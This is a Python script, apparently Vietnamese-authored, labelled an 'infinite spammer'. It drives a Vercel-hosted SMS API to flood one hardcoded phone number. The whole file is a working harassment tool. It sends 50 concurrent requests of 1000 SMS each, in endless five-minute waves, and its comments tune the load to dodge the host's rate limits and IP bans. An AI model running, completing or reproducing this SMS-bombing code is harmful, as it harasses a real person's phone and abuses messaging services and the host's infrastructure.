# -*- coding: utf-8 -*-
"""
INFINITE SPAMMER - VERCEL EDITION
"""
import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor

# Fix encoding
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')

print("=== SPAM SMS API VERCEL ===")
print("Nhap URL Vercel cua ban (VD: https://bongssssms.vercel.app)")
DOMAIN = input("Domain: ").strip()

if not DOMAIN.startswith("http"):
    DOMAIN = "https://" + DOMAIN

if DOMAIN.endswith("/"):
    DOMAIN = DOMAIN[:-1]
    
URL = f"{DOMAIN}/api/sms/send"
PHONE = "0865526740"

# CAU HINH MAX POWER
# Luu y: Vercel co gioi han thoi gian xu ly (10-60s) va rate limit
# Nen ta giam so thread xuong mot chut de tranh bi Vercel ban IP
CONCURRENT_REQUESTS = 50  
SERVICES_PER_REQ = 1000   
RUN_DURATION = 300 
COOLDOWN_DURATION = 10

print(f"\n🚀 KICH HOAT SPAM VERCEL 🚀")
print(f"Target: {PHONE}")
print(f"API: {URL}")
print("=" * 60)

def send_request(_):
    try:
        data = {"phone": PHONE, "amount": SERVICES_PER_REQ}
        requests.post(URL, json=data, timeout=5)
        return True
    except:
        return False

def run_wave(wave_num):
    print(f"\n🌊 WAVE {wave_num} STARTING - 5 MINUTES...")
    end_time = time.time() + RUN_DURATION
    
    total_sent = 0
    count = 0
    
    with ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
        while time.time() < end_time:
            futures = [executor.submit(send_request, i) for i in range(CONCURRENT_REQUESTS)]
            
            count += CONCURRENT_REQUESTS
            total_sent += (CONCURRENT_REQUESTS * SERVICES_PER_REQ)
            
            if count % 1000 == 0:
                elapsed = RUN_DURATION - (end_time - time.time())
                print(f"  [{elapsed:.0f}s] Da gui lenh {total_sent} SMS...")
                
    return total_sent

wave = 1
while True:
    sent = run_wave(wave)
    print(f"\n✅ WAVE {wave} DONE - SENT {sent}")
    print(f"😴 Nghi {COOLDOWN_DURATION}s...")
    time.sleep(COOLDOWN_DURATION)
    wave += 1
